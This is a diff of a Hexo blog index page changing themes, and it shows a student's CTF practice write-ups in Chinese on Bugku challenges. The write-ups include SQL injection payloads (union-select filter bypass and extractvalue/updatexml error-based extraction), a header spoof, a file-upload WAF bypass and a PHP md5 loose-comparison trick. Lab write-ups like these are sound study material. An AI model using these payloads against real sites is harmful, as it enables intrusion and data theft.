-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/13/20-09-13/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/13/20-09-13/">20-09-13</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/13/20-09-13/">
+          
+          
+            
+          
+          多次(bugku)id从1-5显示，id=5时提示SQL注入（使用url输入时的形式写）
+
+id=5’%23 (%23为#)，有回显
+id=5’+or+1=1%23，显示error，考虑是关键字被过滤了
+尝试加注释，没有效果
+双写or，有回显
+id=5’+oorrder+by+2%23有回显，3无回显,说明有两列
+id=5’+union+select+null,null%23显示error，依次尝
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-13 11:06" pubdate>
+              2020-09-13
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/13/20-09-13/" itemprop="url">20-09-13</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-13T11:06:38+08:00">
-                2020-09-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  592 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>多次(bugku)<br>id从1-5显示，id=5时提示SQL注入（使用url输入时的形式写）</p>
-<ul>
-<li>id=5’%23 (%23为#)，有回显</li>
-<li>id=5’+or+1=1%23，显示error，考虑是关键字被过滤了</li>
-<li>尝试加注释，没有效果</li>
-<li>双写or，有回显</li>
-<li>id=5’+oorrder+by+2%23有回显，3无回显,说明有两列</li>
-<li>id=5’+union+select+null,null%23显示error，依次尝试双写union和select，发现这两个都被过滤了</li>
-<li>id=0’+ununionion+seselectlect+1,2%23回显只有2，考虑只显示第二个参数</li>
-<li>id=0’+ununionion+seselectlect+null,database()%23得到数据库名web1002-1</li>
-<li>id=0’+ununionion+seselectlect+null,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=’web1002-1’%23得到表名flag1,hint</li>
-<li>id=0’+ununionion+seselectlect+null,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name=’flag1’%23得到列名flag1,address</li>
-<li>id=0’+ununionion+seselectlect+null,flag1+from+flag1%23得到flag，转小写提交发现不对</li>
-<li>题目提示有两个flag</li>
-<li><p>id=0’+ununionion+seselectlect+null,address+from+flag1%23得到下一关地址</p>
-<p>进到下一关之后发现依然是SQL注入的题</p>
-</li>
-<li><p>id=1到id=7都是绿字，之后显示nobody</p>
-</li>
-<li>id=1’%23回显正常</li>
-<li>id=1’+or+1=1%23回显正常</li>
-<li>id=1’+and+1=2%23预料之中显示nobody，目前看来可以注入</li>
-<li>id=1’+order+by+2%23正常回显，id=1’+order+by+3%23显示nobody并且有报错信息</li>
-<li>id=1’+union+select+null,null%23显示nobody并且报错</li>
-<li>考虑各种绕过都不行</li>
-<li><p>注意到有报错信息，尝试报错注入</p>
-<p>有关报错注入<a href="https://www.cnblogs.com/s1ye/p/8261979.html" target="_blank" rel="noopener">相关文章</a><br>使用extractvalue() payload</p>
-</li>
-<li>id=0’+and+extractvalue(1,concat(0x7e,database(),0x7e))%23在报错信息中得到数据库名web1002-2</li>
-<li>id=1’+and+extractvalue(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=’web1002-2’),0x7e))%23得到表名class,flag2</li>
-<li>id=1’+and+extractvalue(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_name=’flag2’),0x7e))%23得到列名flag2,address</li>
-<li>id=0’+and+extractvalue(1,concat(0x7e,(select+flag2+from+flag2),0x7e))%23得到flag，小写提交得到结果<br>其他报错注入快速一览</li>
-<li><em>floor() payload:  and select count(</em>) from information_schema.tables group by concat(user(),floor(rand(0)<em>2))—</em></li>
-<li><em>extractvalue() payload:  and extractvalue(1,concat(0x7e,user(),0x7e))—</em></li>
-<li><em>updatexml() payload:  and updatexml(1,concat(0x7e,(select user()),0x7e),1)—</em></li>
-<li><em>exp() payload:  and exp(~(select </em> from(select user())x))—*</li>
-<li><em>geometrycollection() payload:  and geometrycollection((select </em> from(select <em> from(select user())a)b))—</em></li>
-<li><em>multipoint() payload:  and multipoint((select </em> from(select <em> from(select user())a)b))—</em></li>
-<li><em>polygon() payload:  and polygon((select </em> from(select <em> from(select user())a)b))—</em></li>
-<li><em>multipolygon() payload:  and multipolygon((select </em> from(select <em> from(select user())a)b))—</em></li>
-<li><em>linestring() payload:  and linestring((select </em> from(select <em> from(select user())a)b))—</em></li>
-<li><em>multilinestring() payload:  and multilinestring((select </em> from(select <em> from(select user())a)b))—</em></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/12/20-09-12/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/12/20-09-12/">20-09-12</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/12/20-09-12/">
+          
+          
+            
+          
+          程序员本地网站(bugku)显然是xff欺骗，bp拦包加上X-Forwarded-For: 127.0.0.1即可
+
+各种绕过先补充一些小细节：
+
+无论get还是post传参，页面上的传参都只能传字符串
+hash对数组无效，返回0
+
+&lt;?php
+$b=$_GET['b'];
+var_dump($b);
+$c=$_POST['c'];
+var_dump($c);
+?&gt;
+b=1（或c）时，
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-12 10:33" pubdate>
+              2020-09-12
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/12/20-09-12/" itemprop="url">20-09-12</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-12T10:33:01+08:00">
-                2020-09-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  488 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>程序员本地网站(bugku)<br>显然是xff欺骗，bp拦包加上X-Forwarded-For: 127.0.0.1即可</p>
-<hr>
-<p>各种绕过<br>先补充一些小细节：</p>
-<ul>
-<li>无论get还是post传参，页面上的传参都只能传字符串</li>
-<li>hash对数组无效，返回0</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">var_dump($b);</span><br><span class="line">$c&#x3D;$_POST[&#39;c&#39;];</span><br><span class="line">var_dump($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>b=1（或c）时，显示string(1) “1”<br>b(或c)[]=123时，显示array(1) { [0]=&gt; string(3) “123” }<br>b(或c)[]=1,2,3时，显示array(1) { [0]=&gt; string(5) “1,2,3” }</p>
-<p>扯远了，开始做题<br>要uname和passwd不相等而sha1加密后的值相等，只需要传入数组。<br>id==’margin’，本想着让id=0，但是传参得到的id是字符串，无效，老老实实传入id=margin即可</p>
-<hr>
-<p>web8(bugku)<br>extract函数将传入的数组中的名值对变成变量名和变量值<br>fn是通过读文件流得到，使用fn=php://input从而输入流传参</p>
-<hr>
-<p>细心(bugku)<br>进去一看就是假的404界面。。。两个链接都没什么用，看源码和请求响应头都没有信息。<br>常规查看各种目录，在robots.txt发现目录resusl.php,进入显示不是管理员且ip被记录，以为是xff伪装发现没有，直接爆破x发现密码就是admin,传参x=admin得到flag</p>
-<hr>
-<p>getshell(bugku)<br>文件上传绕过WAF检测的题<br>随便上传一张照片，提交正常，POST表单提交文件，使用multipart/form-data编码方式，会有Content-Type检测文件类型，multipart/form-data严格小写，可以通过大写某个字母绕过这种WAF检测<br>上传jpg文件再bp拦包改回成php文件，同时绕过WAF检测，但是发现还是不行，虽然可以长传文件但是会变成jpg文件，考虑后缀黑名单，依次改后缀为php2,php3,php4,php5,phps,pht, phtm, phtml，在php5使成功上传得到flag</p>
-<blockquote>
-<p>关于WAF相关文章：<a href="http://www.lmxspace.com/2018/11/10/%E5%85%B3%E4%BA%8EWAF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/" target="_blank" rel="noopener">关于WAF那些事</a></p>
-</blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
-
+  <div class="row mx-auto index-card">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/11/20-09-11/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="renex">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="renex的杂烩集">
-    </span>
-
     
-      <header class="post-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2020/09/11/20-09-11/">20-09-11</a>
+      </h1>
 
+      <p class="index-excerpt">
+        <a href="/2020/09/11/20-09-11/">
+          
+          
+            
+          
+          bugku旧平台上的题没人维护。。
+
+你从哪里来(bugku)注意Referer头要加http://(https://)协议头！！！
+
+md5 collision(NUPT_CTF)bugku里没给出a的判别条件，裂开\\bugku缺的源码代码
+&lt;?php
+$md51 = md5('QNKCDZO');
+$a = @$_GET['a'];
+$md52 = @md5($a);
+if(isset
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2020-09-11 19:23" pubdate>
+              2020-09-11
+            </time>
+          </div>
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/09/11/20-09-11/" itemprop="url">20-09-11</a></h1>
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">ctf刷题笔记</a>
+            
+          </div>
         
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-11T19:23:21+08:00">
-                2020-09-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf刷题笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  253 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         
-          
-            <p>bugku旧平台上的题没人维护。。</p>
-<hr>
-<p>你从哪里来(bugku)<br>注意Referer头要加<a href="http://(https://)协议头！！！" target="_blank" rel="noopener">http://(https://)协议头！！！</a></p>
-<hr>
-<p>md5 collision(NUPT_CTF)<br>bugku里没给出a的判别条件，裂开<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\\bugku缺的源码代码</span><br><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>要构造a使a != ‘QNKCDZO’并且md51==md52<br>md51=0e830400451993494058024219903391，根据php弱比较的特点：</p>
-<blockquote>
-<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p>
-</blockquote>
-<p>只要md52也是0e开头的数字内容的字符串,他们转换为数值后都是0，即可使得md51==md52</p>
-<p>补充：现在md5加密已经并不唯一，可以通过如“构造前缀碰撞法”进行哈希碰撞，使两个文件MD5值一致且都能正常运行，但是执行的内容不同。<a href="https://wooyun.js.org/drops/MD5%E7%A2%B0%E6%92%9E%E7%9A%84%E6%BC%94%E5%8C%96%E4%B9%8B%E8%B7%AF.html" target="_blank" rel="noopener">相关阅读</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+      </div>
+    </article>
   </div>
-  
-  
-  
-  </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  <nav aria-label="navigation">
+    <span class="pagination" id="pagination">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="iconfont icon-arrowright"></i></a>
+    </span>
   </nav>
-
-
-
-          </div>
-          
-
-
-          
-
-        </div>
-        
-          
   
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+  <script>
+    for (ele of document.getElementById("pagination").getElementsByTagName("a")) {
+      ele.href += '#board';
+    }
+  </script>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
   </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">renex</p>
-              <p class="site-description motion-element" itemprop="description">瞎写糊涂账</p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/%7C%7C%20archive">
-              
-                  <span class="site-state-item-count">28</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
-                  <span class="site-state-item-name">categories</span>
-                </a>
-              </div>
-            
-
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">renex</span>
-
-  
 </div>
+  
 
+  
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  
 
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
     
 
     
 
+    
   </div>
+</footer>
 
-  
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
+<!-- Plugins -->
 
 
   
-
-
+    <script  src="/js/lazyload.js" ></script>
   
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
 
 
 
@@ -2336,11 +709,8 @@
 
 
 
-
-
-  
-
-
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
 
 
 
@@ -2350,49 +720,58 @@
 
 
 
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
-  
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "An elegant Material-Design theme for Hexo&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
 
-  
 
-  
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
